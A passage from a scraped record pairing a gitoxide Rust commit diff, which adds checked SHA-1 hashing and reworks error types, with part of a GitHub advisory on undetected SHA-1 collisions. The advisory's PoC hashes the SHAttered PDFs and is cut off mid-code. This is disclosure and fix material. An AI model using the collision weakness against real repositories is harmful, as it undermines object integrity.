self.output.hash.clone().digest();\n-                self.output.inner.write_all(&digest[..])?;\n-                self.written += digest.len() as u64;\n-                self.output.inner.flush()?;\n+                let digest = self\n+                    .output\n+                    .hash\n+                    .clone()\n+                    .try_finalize()\n+                    .map_err(gix_hash::io::Error::from)?;\n+                self.output\n+                    .inner\n+                    .write_all(digest.as_slice())\n+                    .map_err(gix_hash::io::Error::from)?;\n+                self.written += digest.as_slice().len() as u64;\n+                self.output.inner.flush().map_err(gix_hash::io::Error::from)?;\n                 self.is_done = true;\n-                self.trailer = Some(gix_hash::ObjectId::from(digest));\n+                self.trailer = Some(digest);\n             }\n         }\n         Ok(self.written - previous_written)\n```\n\nFilename: gix-pack/src/index/encode.rs:\n```\n@@ -36,13 +36,9 @@\npub(crate) fn fanout(iter: &mut dyn ExactSizeIterator<Item = u8>) -> [u32; 256]\n mod function {\n     use std::io;\n \n-    use gix_features::{\n-        hash,\n-        progress::{self, DynNestedProgress},\n-    };\n-\n     use super::{fanout, HIGH_BIT, LARGE_OFFSET_THRESHOLD};\n     use crate::index::V2_SIGNATURE;\n+    use gix_features::progress::{self, DynNestedProgress};\n \n     struct Count<W> {\n         bytes: u64,\n\n@@ -76,7 +72,7 @@\nmod function {\n         pack_hash: &gix_hash::ObjectId,\n         kind: crate::index::Version,\n         progress: &mut dyn DynNestedProgress,\n-    ) -> io::Result<gix_hash::ObjectId> {\n+    ) -> Result<gix_hash::ObjectId, gix_hash::io::Error> {\n         use io::Write;\n         assert_eq!(kind, crate::index::Version::V2, \"Can only write V2 packs right now\");\n         assert!(\n\n@@ -87,7 +83,7 @@\nmod function {\n         // Write header\n         let mut out = Count::new(std::io::BufWriter::with_capacity(\n             8 * 4096,\n-            hash::Write::new(out, kind.hash()),\n+            gix_hash::io::Write::new(out, kind.hash()),\n         ));\n         out.write_all(V2_SIGNATURE)?;\n         out.write_all(&(kind as u32).to_be_bytes())?;\n\n@@ -138,8 +134,8 @@\nmod function {\n         out.write_all(pack_hash.as_slice())?;\n \n         let bytes_written_without_trailer = out.bytes;\n-        let out = out.inner.into_inner()?;\n-        let index_hash: gix_hash::ObjectId = out.hash.digest().into();\n+        let out = out.inner.into_inner().map_err(io::Error::from)?;\n+        let index_hash = out.hash.try_finalize()?;\n         out.inner.write_all(index_hash.as_slice())?;\n         out.inner.flush()?;\n```\n\nFilename: gix-pack/src/index/traverse/error.rs:\n```\n@@ -6,8 +6,8 @@\nuse crate::index;\n pub enum Error<E: std::error::Error + Send + Sync + 'static> {\n     #[error(\"One of the traversal processors failed\")]\n     Processor(#[source] E),\n-    #[error(\"Index file, pack file or object verification failed\")]\n-    VerifyChecksum(#[from] index::verify::checksum::Error),\n+    #[error(\"Failed to verify index file checksum\")]\n+    IndexVerify(#[source] index::verify::checksum::Error),\n     #[error(\"The pack delta tree index could not be built\")]\n     Tree(#[from] crate::cache::delta::from_offsets::Error),\n     #[error(\"The tree traversal failed\")]\n\n@@ -20,17 +20,15 @@\npub enum Error<E: std::error::Error + Send + Sync + 'static> {\n         offset: u64,\n         source: crate::data::decode::Error,\n     },\n-    #[error(\"The packfiles checksum didn't match the index file checksum: expected {expected}, got {actual}\")]\n-    PackMismatch {\n-        expected: gix_hash::ObjectId,\n-        actual: gix_hash::ObjectId,\n-    },\n-    #[error(\"The hash of {kind} object at offset {offset} didn't match the checksum in the index file: expected {expected}, got {actual}\")]\n-    PackObjectMismatch {\n-        expected: gix_hash::ObjectId,\n-        actual: gix_hash::ObjectId,\n+    #[error(\"The packfiles checksum didn't match the index file checksum\")]\n+    PackMismatch(#[source] gix_hash::verify::Error),\n+    #[error(\"Failed to verify pack file checksum\")]\n+    PackVerify(#[source] crate::verify::checksum::Error),\n+    #[error(\"Error verifying object at offset {offset} against checksum in the index file\")]\n+    PackObjectVerify {\n         offset: u64,\n-        kind: gix_object::Kind,\n+        #[source]\n+        source: gix_object::data::verify::Error,\n     },\n     #[error(\n         \"The CRC32 of {kind} object at offset {offset} didn't match the checksum in the index file: expected {expected}, got {actual}\"\n```\n\nFilename: gix-pack/src/index/traverse/mod.rs:\n```\n@@ -126,18 +126,15 @@\nimpl index::File {\n         E: std::error::Error + Send + Sync + 'static,\n     {\n         Ok(if check.file_checksum() {\n-            if self.pack_checksum() != pack.checksum() {\n-                return Err(Error::PackMismatch {\n-                    actual: pack.checksum(),\n-                    expected: self.pack_checksum(),\n-                });\n-            }\n+            pack.checksum()\n+                .verify(&self.pack_checksum())\n+                .map_err(Error::PackMismatch)?;\n             let (pack_res, id) = parallel::join(\n                 move || pack.verify_checksum(pack_progress, should_interrupt),\n                 move || self.verify_checksum(index_progress, should_interrupt),\n             );\n-            pack_res?;\n-            id?\n+            pack_res.map_err(Error::PackVerify)?;\n+            id.map_err(Error::IndexVerify)?\n         } else {\n             self.index_checksum()\n         })\n\n@@ -210,15 +207,12 @@\nwhere\n     E: std::error::Error + Send + Sync + 'static,\n {\n     if check.object_checksum() {\n-        let actual_oid = gix_object::compute_hash(index_entry.oid.kind(), object_kind, decompressed);\n-        if actual_oid != index_entry.oid {\n-            return Err(Error::PackObjectMismatch {\n-                actual: actual_oid,\n-                expected: index_entry.oid,\n+        gix_object::Data::new(object_kind, decompressed)\n+            .verify_checksum(&index_entry.oid)\n+            .map_err(|source| Error::PackObjectVerify {\n                 offset: index_entry.pack_offset,\n-                kind: object_kind,\n-            });\n-        }\n+                source,\n+            })?;\n         if let Some(desired_crc32) = index_entry.crc32 {\n             let actual_crc32 = pack_entry_crc32();\n             if actual_crc32 != desired_crc32 {\n```\n\nFilename: gix-pack/src/index/verify.rs:\n```\n@@ -220,7 +220,7 @@\nimpl index::File {\n                         .add_child_with_id(\"Sha1 of index\".into(), integrity::ProgressId::ChecksumBytes.into()),\n                     should_interrupt,\n                 )\n-                .map_err(Into::into)\n+                .map_err(index::traverse::Error::IndexVerify)\n                 .map(|id| integrity::Outcome {\n                     actual_index_checksum: id,\n                     pack_traverse_statistics: None,\n```\n\nFilename: gix-pack/src/index/write/error.rs:\n```\n@@ -1,11 +1,9 @@\n-use std::io;\n-\n /// Returned by [`crate::index::File::write_data_iter_to_stream()`]\n #[derive(thiserror::Error, Debug)]\n #[allow(missing_docs)]\n pub enum Error {\n-    #[error(\"An IO error occurred when reading the pack or creating a temporary file\")]\n-    Io(#[from] io::Error),\n+    #[error(\"An error occurred when writing the pack index file\")]\n+    Io(#[from] gix_hash::io::Error),\n     #[error(\"A pack entry could not be extracted\")]\n     PackEntryDecode(#[from] crate::data::input::Error),\n     #[error(\"Indices of type {} cannot be written, only {} are supported\", *.0 as usize, crate::index::Version::default() as usize)]\n```\n\nFilename: gix-pack/src/index/write/mod.rs:\n```\n@@ -180,7 +180,7 @@\nimpl crate::index::File {\n \n         root_progress.inc();\n \n-        let (resolver, pack) = make_resolver()?;\n+        let (resolver, pack) = make_resolver().map_err(gix_hash::io::Error::from)?;\n         let sorted_pack_offsets_by_oid = {\n             let traverse::Outcome { roots, children } = tree.traverse(\n                 resolver,\n\n@@ -192,10 +192,7 @@\nimpl crate::index::File {\n                      entry,\n                      decompressed: bytes,\n                      ..\n-                 }| {\n-                    modify_base(data, entry, bytes, version.hash());\n-                    Ok::<_, Error>(())\n-                },\n+                 }| { modify_base(data, entry, bytes, version.hash()) },\n                 traverse::Options {\n                     object_progress: Box::new(\n                         root_progress.add_child_with_id(\"Resolving\".into(), ProgressId::ResolveObjects.into()),\n\n@@ -225,9 +222,9 @@\nimpl crate::index::File {\n             Some(ph) => ph,\n             None if num_objects == 0 => {\n                 let header = crate::data::header::encode(pack_version, 0);\n-                let mut hasher = gix_features::hash::hasher(object_hash);\n+                let mut hasher = gix_hash::hasher(object_hash);\n                 hasher.update(&header);\n-                gix_hash::ObjectId::from(hasher.digest())\n+                hasher.try_finalize().map_err(gix_hash::io::Error::from)?\n             }\n             None => return Err(Error::IteratorInvariantTrailer),\n         };\n\n@@ -253,8 +250,14 @@\nimpl crate::index::File {\n     }\n }\n \n-fn modify_base(entry: &mut TreeEntry, pack_entry: &crate::data::Entry, decompressed: &[u8], hash: gix_hash::Kind) {\n+fn modify_base(\n+    entry: &mut TreeEntry,\n+    pack_entry: &crate::data::Entry,\n+    decompressed: &[u8],\n+    hash: gix_hash::Kind,\n+) -> Result<(), gix_hash::hasher::Error> {\n     let object_kind = pack_entry.header.as_kind().expect(\"base object as source of iteration\");\n-    let id = gix_object::compute_hash(hash, object_kind, decompressed);\n+    let id = gix_object::compute_hash(hash, object_kind, decompressed)?;\n     entry.id = id;\n+    Ok(())\n }\n```\n\nFilename: gix-pack/src/multi_index/verify.rs:\n```\n@@ -279,23 +279,14 @@\nimpl File {\n                         use index::traverse::Error::*;\n                         match err {\n                             Processor(err) => Processor(integrity::Error::IndexIntegrity(err)),\n-                            VerifyChecksum(err) => VerifyChecksum(err),\n+                            IndexVerify(err) => IndexVerify(err),\n                             Tree(err) => Tree(err),\n                             TreeTraversal(err) => TreeTraversal(err),\n+                            PackVerify(err) => PackVerify(err),\n                             PackDecode { id, offset, source } => PackDecode { id, offset, source },\n-                            PackMismatch { expected, actual } => PackMismatch { expected, actual },\n+                            PackMismatch(err) => PackMismatch(err),\n                             EntryType(err) => EntryType(err),\n-                            PackObjectMismatch {\n-                                expected,\n-                                actual,\n-                                offset,\n-                                kind,\n-                            } => PackObjectMismatch {\n-                                expected,\n-                                actual,\n-                                offset,\n-                                kind,\n-                            },\n+                            PackObjectVerify { offset, source } => PackObjectVerify { offset, source },\n                             Crc32Mismatch {\n                                 expected,\n                                 actual,\n```\n\nFilename: gix-pack/src/multi_index/write.rs:\n```\n@@ -14,7 +14,7 @@\nmod error {\n     #[allow(missing_docs)]\n     pub enum Error {\n         #[error(transparent)]\n-        Io(#[from] std::io::Error),\n+        Io(#[from] gix_hash::io::Error),\n         #[error(\"Interrupted\")]\n         Interrupted,\n         #[error(transparent)]\n\n@@ -83,7 +83,7 @@\nimpl multi_index::File {\n         should_interrupt: &AtomicBool,\n         Options { object_hash }: Options,\n     ) -> Result<Outcome, Error> {\n-        let out = gix_features::hash::Write::new(out, object_hash);\n+        let out = gix_hash::io::Write::new(out, object_hash);\n         let (index_paths_sorted, index_filenames_sorted) = {\n             index_paths.sort();\n             let file_names = index_paths\n\n@@ -181,30 +181,34 @@\nimpl multi_index::File {\n             cf.num_chunks().try_into().expect(\"BUG: wrote more than 256 chunks\"),\n             index_paths_sorted.len() as u32,\n             object_hash,\n-        )?;\n+        )\n+        .map_err(gix_hash::io::Error::from)?;\n \n         {\n             progress.set_name(\"Writing chunks\".into());\n             progress.init(Some(cf.num_chunks()), gix_features::progress::count(\"chunks\"));\n \n-            let mut chunk_write = cf.into_write(&mut out, bytes_written)?;\n+            let mut chunk_write = cf\n+                .into_write(&mut out, bytes_written)\n+                .map_err(gix_hash::io::Error::from)?;\n             while let Some(chunk_to_write) = chunk_write.next_chunk() {\n                 match chunk_to_write {\n                     multi_index::chunk::index_names::ID => {\n-                        multi_index::chunk::index_names::write(&index_filenames_sorted, &mut chunk_write)?;\n+                        multi_index::chunk::index_names::write(&index_filenames_sorted, &mut chunk_write)\n                     }\n-                    multi_index::chunk::fanout::ID => multi_index::chunk::fanout::write(&entries, &mut chunk_write)?,\n-                    multi_index::chunk::lookup::ID => multi_index::chunk::lookup::write(&entries, &mut chunk_write)?,\n+                    multi_index::chunk::fanout::ID => multi_index::chunk::fanout::write(&entries, &mut chunk_write),\n+                    multi_index::chunk::lookup::ID => multi_index::chunk::lookup::write(&entries, &mut chunk_write),\n                     multi_index::chunk::offsets::ID => {\n-                        multi_index::chunk::offsets::write(&entries, num_large_offsets.is_some(), &mut chunk_write)?;\n+                        multi_index::chunk::offsets::write(&entries, num_large_offsets.is_some(), &mut chunk_write)\n                     }\n                     multi_index::chunk::large_offsets::ID => multi_index::chunk::large_offsets::write(\n                         &entries,\n                         num_large_offsets.expect(\"available if planned\"),\n                         &mut chunk_write,\n-                    )?,\n+                    ),\n                     unknown => unreachable!(\"BUG: forgot to implement chunk {:?}\", std::str::from_utf8(&unknown)),\n                 }\n+                .map_err(gix_hash::io::Error::from)?;\n                 progress.inc();\n                 if should_interrupt.load(Ordering::Relaxed) {\n                     return Err(Error::Interrupted);\n\n@@ -213,8 +217,11 @@\nimpl multi_index::File {\n         }\n \n         // write trailing checksum\n-        let multi_index_checksum: gix_hash::ObjectId = out.inner.hash.digest().into();\n-        out.inner.inner.write_all(multi_index_checksum.as_slice())?;\n+        let multi_index_checksum = out.inner.hash.try_finalize().map_err(gix_hash::io::Error::from)?;\n+        out.inner\n+            .inner\n+            .write_all(multi_index_checksum.as_slice())\n+            .map_err(gix_hash::io::Error::from)?;\n         out.progress.show_throughput(write_start);\n \n         Ok(Outcome { multi_index_checksum })\n```\n\nFilename: gix-pack/src/verify.rs:\n```\n@@ -10,11 +10,10 @@\npub mod checksum {\n     pub enum Error {\n         #[error(\"Interrupted by user\")]\n         Interrupted,\n-        #[error(\"index checksum mismatch: expected {expected}, got {actual}\")]\n-        Mismatch {\n-            expected: gix_hash::ObjectId,\n-            actual: gix_hash::ObjectId,\n-        },\n+        #[error(\"Failed to hash data\")]\n+        Hasher(#[from] gix_hash::hasher::Error),\n+        #[error(transparent)]\n+        Verify(#[from] gix_hash::verify::Error),\n     }\n }\n\n@@ -26,8 +25,8 @@\npub fn fan(data: &[u32]) -> Option<usize> {\n }\n \n /// Calculate the hash of the given kind by trying to read the file from disk at `data_path` or falling back on the mapped content in `data`.\n-/// `Ok(desired_hash)` or `Err(Some(actual_hash))` is returned if the hash matches or mismatches.\n-/// If the `Err(None)` is returned, the operation was interrupted.\n+/// `Ok(expected)` or [`checksum::Error::Verify`] is returned if the hash matches or mismatches.\n+/// If the [`checksum::Error::Interrupted`] is returned, the operation was interrupted.\n pub fn checksum_on_disk_or_mmap(\n     data_path: &Path,\n     data: &[u8],\n\n@@ -37,28 +36,28 @@\npub fn checksum_on_disk_or_mmap(\n     should_interrupt: &AtomicBool,\n ) -> Result<gix_hash::ObjectId, checksum::Error> {\n     let data_len_without_trailer = data.len() - object_hash.len_in_bytes();\n-    let actual = match gix_features::hash::bytes_of_file(\n+    let actual = match gix_hash::bytes_of_file(\n         data_path,\n         data_len_without_trailer as u64,\n         object_hash,\n         progress,\n         should_interrupt,\n     ) {\n         Ok(id) => id,\n-        Err(err) if err.kind() == std::io::ErrorKind::Interrupted => return Err(checksum::Error::Interrupted),\n-        Err(_io_err) => {\n+        Err(gix_hash::io::Error::Io(err)) if err.kind() == std::io::ErrorKind::Interrupted => {\n+            return Err(checksum::Error::Interrupted);\n+        }\n+        Err(gix_hash::io::Error::Io(_io_err)) => {\n             let start = std::time::Instant::now();\n-            let mut hasher = gix_features::hash::hasher(object_hash);\n+            let mut hasher = gix_hash::hasher(object_hash);\n             hasher.update(&data[..data_len_without_trailer]);\n             progress.inc_by(data_len_without_trailer);\n             progress.show_throughput(start);\n-            gix_hash::ObjectId::from(hasher.digest())\n+            hasher.try_finalize()?\n         }\n+        Err(gix_hash::io::Error::Hasher(err)) => return Err(checksum::Error::Hasher(err)),\n     };\n \n-    if actual == expected {\n-        Ok(actual)\n-    } else {\n-        Err(checksum::Error::Mismatch { actual, expected })\n-    }\n+    actual.verify(&expected)?;\n+    Ok(actual)\n }\n```\n\nFilename: gix-status/src/index_as_worktree/function.rs:\n```\n@@ -359,7 +359,7 @@\nimpl<'index> State<'_, 'index> {\n             Err(err) if gix_fs::io_err::is_not_found(err.kind(), err.raw_os_error()) => {\n                 return Ok(Some(Change::Removed.into()))\n             }\n-            Err(err) => return Err(err.into()),\n+            Err(err) => return Err(Error::Io(err.into())),\n         };\n         self.symlink_metadata_calls.fetch_add(1, Ordering::Relaxed);\n         let metadata = match gix_index::fs::Metadata::from_path_no_follow(worktree_path) {\n\n@@ -385,7 +385,7 @@\nimpl<'index> State<'_, 'index> {\n                 return Ok(Some(Change::Removed.into()))\n             }\n             Err(err) => {\n-                return Err(err.into());\n+                return Err(Error::Io(err.into()));\n             }\n         };\n         if entry.flags.contains(gix_index::entry::Flags::INTENT_TO_ADD) {\n\n@@ -562,8 +562,9 @@\nwhere\n             self.buf.clear();\n             let platform = self\n                 .attr_stack\n-                .at_entry(self.rela_path, Some(self.entry.mode), &self.objects)?;\n-            let file = std::fs::File::open(self.path)?;\n+                .at_entry(self.rela_path, Some(self.entry.mode), &self.objects)\n+                .map_err(gix_hash::io::Error::from)?;\n+            let file = std::fs::File::open(self.path).map_err(gix_hash::io::Error::from)?;\n             let out = self\n                 .filter\n                 .convert_to_git(\n\n@@ -574,7 +575,7 @@\nwhere\n                     },\n                     &mut |buf| Ok(self.objects.find_blob(self.id, buf).map(|_| Some(()))?),\n                 )\n-                .map_err(|err| io::Error::new(io::ErrorKind::Other, err))?;\n+                .map_err(|err| Error::Io(io::Error::new(io::ErrorKind::Other, err).into()))?;\n             let len = match out {\n                 ToGitOutcome::Unchanged(_) => Some(self.file_len),\n                 ToGitOutcome::Process(_) | ToGitOutcome::Buffer(_) => None,\n```\n\nFilename: gix-status/src/index_as_worktree/traits.rs:\n```\n@@ -143,14 +143,16 @@\nimpl CompareBlobs for HashEq {\n         let mut stream = data.stream_worktree_file()?;\n         match stream.as_bytes() {\n             Some(buffer) => {\n-                let file_hash = gix_object::compute_hash(entry.id.kind(), gix_object::Kind::Blob, buffer);\n+                let file_hash = gix_object::compute_hash(entry.id.kind(), gix_object::Kind::Blob, buffer)\n+                    .map_err(gix_hash::io::Error::from)?;\n                 Ok((entry.id != file_hash).then_some(file_hash))\n             }\n             None => {\n                 let file_hash = match stream.size() {\n                     None => {\n-                        stream.read_to_end(buf)?;\n+                        stream.read_to_end(buf).map_err(gix_hash::io::Error::from)?;\n                         gix_object::compute_hash(entry.id.kind(), gix_object::Kind::Blob, buf)\n+                            .map_err(gix_hash::io::Error::from)?\n                     }\n                     Some(len) => gix_object::compute_stream_hash(\n                         entry.id.kind(),\n```\n\nFilename: gix-status/src/index_as_worktree/types.rs:\n```\n@@ -10,7 +10,7 @@\npub enum Error {\n     #[error(\"The clock was off when reading file related metadata after updating a file on disk\")]\n     Time(#[from] std::time::SystemTimeError),\n     #[error(\"IO error while writing blob or reading file metadata or changing filetype\")]\n-    Io(#[from] std::io::Error),\n+    Io(#[from] gix_hash::io::Error),\n     #[error(\"Failed to obtain blob from object database\")]\n     Find(#[from] gix_object::find::existing_object::Error),\n     #[error(\"Could not determine status for submodule at '{rela_path}'\")]\n```\n\nFilename: gix-status/src/index_as_worktree_with_renames/mod.rs:\n```\n@@ -536,18 +536,21 @@\npub(super) mod function {\n                             should_interrupt,\n                         )\n                         .map_err(Error::HashFile)?,\n-                        ToGitOutcome::Buffer(buf) => gix_object::compute_hash(object_hash, gix_object::Kind::Blob, buf),\n+                        ToGitOutcome::Buffer(buf) => gix_object::compute_hash(object_hash, gix_object::Kind::Blob, buf)\n+                            .map_err(|err| Error::HashFile(err.into()))?,\n                         ToGitOutcome::Process(mut stream) => {\n                             buf.clear();\n-                            stream.read_to_end(buf).map_err(Error::HashFile)?;\n+                            stream.read_to_end(buf).map_err(|err| Error::HashFile(err.into()))?;\n                             gix_object::compute_hash(object_hash, gix_object::Kind::Blob, buf)\n+                                .map_err(|err| Error::HashFile(err.into()))?\n                         }\n                     }\n                 }\n                 Kind::Symlink => {\n                     let path = worktree_root.join(gix_path::from_bstr(rela_path));\n                     let target = gix_path::into_bstr(std::fs::read_link(path).map_err(Error::ReadLink)?);\n                     gix_object::compute_hash(object_hash, gix_object::Kind::Blob, &target)\n+                        .map_err(|err| Error::HashFile(err.into()))?\n                 }\n                 Kind::Directory | Kind::Repository => object_hash.null(),\n             })\n```\n\nFilename: gix-status/src/index_as_worktree_with_renames/types.rs:\n```\n@@ -17,7 +17,7 @@\npub enum Error {\n     #[error(\"Could not open worktree file for reading\")]\n     OpenWorktreeFile(std::io::Error),\n     #[error(transparent)]\n-    HashFile(std::io::Error),\n+    HashFile(gix_hash::io::Error),\n     #[error(\"Could not read worktree link content\")]\n     ReadLink(std::io::Error),\n     #[error(transparent)]\n```\n\nFilename: gix/Cargo.toml:\n```\n@@ -217,7 +217,7 @@\nblocking-http-transport-reqwest-native-tls = [\n #! #### Performance\n #!\n #! The reason these features exist is to allow optimization for compile time and optimize for compatibility by default. This means that some performance options around\n-#! SHA1 and ZIP might not compile on all platforms, so it depends on the end-user who compiles the application to chose these based on their needs.\n+#! ZIP might not compile on all platforms, so it depends on the end-user who compiles the application to chose these based on their needs.\n \n ## Activate features that maximize performance, like using threads, but leave everything else that might affect compatibility out to allow users more fine-grained\n ## control over performance features like which `zlib*` implementation to use.\n\n@@ -249,11 +249,7 @@\npack-cache-lru-dynamic = [\"gix-pack/pack-cache-lru-dynamic\"]\n \n ## Activate other features that maximize performance, like usage of threads, `zlib-ng` and access to caching in object databases.\n ## Note that some platforms might suffer from compile failures, which is when `max-performance-safe` should be used.\n-max-performance = [\"max-performance-safe\", \"zlib-ng\", \"fast-sha1\"]\n-\n-## If enabled, use assembly versions of sha1 on supported platforms.\n-## This might cause compile failures as well which is why it can be turned off separately.\n-fast-sha1 = [\"gix-features/fast-sha1\"]\n+max-performance = [\"max-performance-safe\", \"zlib-ng\"]\n \n ## Use the C-based zlib-ng backend, which can compress and decompress significantly faster.\n ## Note that this will cause duplicate symbol errors if the application also depends on `zlib` - use `zlib-ng-compat` in that case.\n```\n\nFilename: gix/src/repository/impls.rs:\n```\n@@ -106,7 +106,7 @@\nimpl gix_object::Write for crate::Repository {\n     }\n \n     fn write_buf(&self, object: gix_object::Kind, from: &[u8]) -> Result<gix_hash::ObjectId, gix_object::write::Error> {\n-        let oid = gix_object::compute_hash(self.object_hash(), object, from);\n+        let oid = gix_object::compute_hash(self.object_hash(), object, from)?;\n         if self.objects.exists(&oid) {\n             return Ok(oid);\n         }\n```\n\nFilename: gix/src/repository/object.rs:\n```\n@@ -172,7 +172,8 @@\nimpl crate::Repository {\n     }\n \n     fn write_object_inner(&self, buf: &[u8], kind: gix_object::Kind) -> Result<Id<'_>, object::write::Error> {\n-        let oid = gix_object::compute_hash(self.object_hash(), kind, buf);\n+        let oid = gix_object::compute_hash(self.object_hash(), kind, buf)\n+            .map_err(|err| Box::new(err) as Box<dyn std::error::Error + Send + Sync>)?;\n         if self.objects.exists(&oid) {\n             return Ok(oid.attach(self));\n         }\n\n@@ -189,7 +190,8 @@\nimpl crate::Repository {\n     /// pre-hashing the data, and checking if the object is already present.\n     pub fn write_blob(&self, bytes: impl AsRef<[u8]>) -> Result<Id<'_>, object::write::Error> {\n         let bytes = bytes.as_ref();\n-        let oid = gix_object::compute_hash(self.object_hash(), gix_object::Kind::Blob, bytes);\n+        let oid = gix_object::compute_hash(self.object_hash(), gix_object::Kind::Blob, bytes)\n+            .map_err(|err| Box::new(err) as Box<dyn std::error::Error + Send + Sync>)?;\n         if self.objects.exists(&oid) {\n             return Ok(oid.attach(self));\n         }\n\n@@ -214,7 +216,8 @@\nimpl crate::Repository {\n     }\n \n     fn write_blob_stream_inner(&self, buf: &[u8]) -> Result<Id<'_>, object::write::Error> {\n-        let oid = gix_object::compute_hash(self.object_hash(), gix_object::Kind::Blob, buf);\n+        let oid = gix_object::compute_hash(self.object_hash(), gix_object::Kind::Blob, buf)\n+            .map_err(|err| Box::new(err) as Box<dyn std::error::Error + Send + Sync>)?;\n         if self.objects.exists(&oid) {\n             return Ok(oid.attach(self));\n         }\n```\n\nFilename: justfile:\n```\n@@ -99,8 +99,6 @@\ncheck:\n     cargo check -p gix-features --all-features\n     cargo check -p gix-features --features parallel\n     cargo check -p gix-features --features fs-read-dir\n-    cargo check -p gix-features --features rustsha1\n-    cargo check -p gix-features --features fast-sha1\n     cargo check -p gix-features --features progress\n     cargo check -p gix-features --features io-pipe\n     cargo check -p gix-features --features crc32\n```\n\nFilename: tests/it/src/commands/git_to_sh.rs:\n```\n@@ -115,7 +115,11 @@\npub(super) mod function {\n                             })?;\n                             let mapped = crate::commands::copy_royal::remapped(data);\n                             (\n-                                gix::objs::compute_hash(repo.object_hash(), gix::object::Kind::Blob, mapped.as_bytes()),\n+                                gix::objs::compute_hash(\n+                                    repo.object_hash(),\n+                                    gix::object::Kind::Blob,\n+                                    mapped.as_bytes(),\n+                                )?,\n                                 Cow::Owned(mapped.into()),\n                             )\n                         }\n```\n\nFilename: tests/snapshots/plumbing/no-repo/pack/explode/broken-delete-pack-to-sink-failure:\n```\n@@ -1,5 +1,5 @@\nError: Failed to explode the entire pack - some loose objects may have been created nonetheless\n \n Caused by:\n-    0: Index file, pack file or object verification failed\n-    1: index checksum mismatch: expected f1cd3cc7bc63a4a2b357a475a58ad49b40355470, got 337fe3b886fc5041a35313887d68feefeae52519\n\\ No newline at end of file\n+    0: Failed to verify pack file checksum\n+    1: Hash was 337fe3b886fc5041a35313887d68feefeae52519, but should have been f1cd3cc7bc63a4a2b357a475a58ad49b40355470\n\\ No newline at end of file\n```\n\nFilename: tests/snapshots/plumbing/no-repo/pack/verify/index-failure:\n```\n@@ -2,5 +2,5 @@\nCould not find matching pack file at 'index.pack' - only index file will be veri\n Error: Verification failure\n \n Caused by:\n-    0: Index file, pack file or object verification failed\n-    1: index checksum mismatch: expected 0eba66e6b391eb83efc3ec9fc8a3087788911c0a, got fa9a8a630eacc2d3df00aff604bec2451ccbc8ff\n\\ No newline at end of file\n+    0: Failed to verify index file checksum\n+    1: Hash was fa9a8a630eacc2d3df00aff604bec2451ccbc8ff, but should have been 0eba66e6b391eb83efc3ec9fc8a3087788911c0a\n\\ No newline at end of file\n```",
                "url": "https://github.com/GitoxideLabs/gitoxide/commit/4660f7a6f71873311f68f170b0f1f6659a02829d"
            }
        ],
        "published_date": "2025-04-04T14:41:56.355Z",
        "sec_adv": [
            {
                "content": "Skip to content\nNavigation Menu\nProduct\nSolutions\nResources\nOpen Source\nEnterprise\nPricing\nSearch or jump to...\nSign in\nSign up\nAppearance settings\nDismiss alert\nGitoxideLabs\n/\ngitoxide\nPublic\nSponsor\nNotifications You must be signed in to change notification settings\nFork 346\nStar 9.8k\nCode\nIssues\n131\nPull requests\n4\nDiscussions\nActions\nProjects\n1\nSecurity\n9\nInsights\nAdditional navigation options\nSHA-1 collision attacks are not detected\nModerate EliahKagan published GHSA-2frx-2596-x5r6 on Apr 3Apr 4, 2025\nPackage\ncargo gitoxide\n(\nRust\n)\nAffected versions\n< 0.42.0\nPatched versions\n>= 0.42.0\ncargo gitoxide-core\n(\nRust\n)\n< 0.46.0\n>= 0.46.0\ncargo gix\n(\nRust\n)\n< 0.71.0\n>= 0.71.0\ncargo gix-archive\n(\nRust\n)\n< 0.20.0\n>= 0.20.0\ncargo gix-blame\n(\nRust\n)\n< 0.1.0\n>= 0.1.0\ncargo gix-commitgraph\n(\nRust\n)\n< 0.27.0\n>= 0.27.0\ncargo gix-config\n(\nRust\n)\n< 0.44.0\n>= 0.44.0\ncargo gix-diff\n(\nRust\n)\n< 0.51.0\n>= 0.51.0\ncargo gix-dir\n(\nRust\n)\n< 0.13.0\n>= 0.13.0\ncargo gix-discover\n(\nRust\n)\n< 0.39.0\n>= 0.39.0\ncargo gix-features\n(\nRust\n)\n< 0.41.0\n>= 0.41.0\ncargo gix-filter\n(\nRust\n)\n< 0.18.0\n>= 0.18.0\ncargo gix-fsck\n(\nRust\n)\n< 0.10.0\n>= 0.10.0\ncargo gix-index\n(\nRust\n)\n< 0.39.0\n>= 0.39.0\ncargo gix-merge\n(\nRust\n)\n< 0.4.0\n>= 0.4.0\ncargo gix-negotiate\n(\nRust\n)\n< 0.19.0\n>= 0.19.0\ncargo gix-object\n(\nRust\n)\n< 0.48.0\n>= 0.48.0\ncargo gix-odb\n(\nRust\n)\n< 0.68.0\n>= 0.68.0\ncargo gix-pack\n(\nRust\n)\n< 0.58.0\n>= 0.58.0\ncargo gix-protocol\n(\nRust\n)\n< 0.49.0\n>= 0.49.0\ncargo gix-ref\n(\nRust\n)\n< 0.51.0\n>= 0.51.0\ncargo gix-revision\n(\nRust\n)\n< 0.33.0\n>= 0.33.0\ncargo gix-revwalk\n(\nRust\n)\n< 0.19.0\n>= 0.19.0\ncargo gix-status\n(\nRust\n)\n< 0.18.0\n>= 0.18.0\ncargo gix-traverse\n(\nRust\n)\n< 0.45.0\n>= 0.45.0\ncargo gix-worktree\n(\nRust\n)\n< 0.40.0\n>= 0.40.0\ncargo gix-worktree-state\n(\nRust\n)\n< 0.18.0\n>= 0.18.0\nDescription\nSummary\ngitoxide uses SHA-1 hash implementations without any collision detection, leaving it vulnerable to hash collision attacks.\nDetails\ngitoxide uses the sha1_smol or sha1 crate, both of which implement standard SHA-1 without any mitigations for collision attacks. This means that two distinct Git objects with colliding SHA-1 hashes would break the Git object model and integrity checks when used with gitoxide.\nThe SHA-1 function is considered cryptographically insecure. However, in the wake of the SHAttered attacks, this issue was mitigated in Git 2.13.0 in 2017 by using the sha1collisiondetection algorithm by default and producing an error when known SHA-1 collisions are detected. Git is in the process of migrating to using SHA-256 for object hashes, but this has not been rolled out widely yet and gitoxide does not support SHA-256 object hashes.\nPoC\nThe following program demonstrates the problem, using the two SHAttered PDFs:\nuse sha1_checked::{CollisionResult, Digest};\n\nfn sha1_oid_of_file(filename: &str) -> gix::ObjectId {\n    let mut hasher = gix::features::hash::hasher(gix::hash::Kind::Sha1);\n    hasher.update(&std::fs::read(filename).unwrap());\n    gix::ObjectId::Sha1(hasher.digest())\n}\n\nfn sha1dc_oid_of_file(filename: &str) -> Result<gix::ObjectId, String> {\n    // Matches Git\u2019s behaviour.\n    let mut hasher = sha1_checked::Builder::default().safe_hash(false).build();\n    hasher.update(&std::fs::read(filename).unwrap());\n    match hasher.try_finalize() {\n        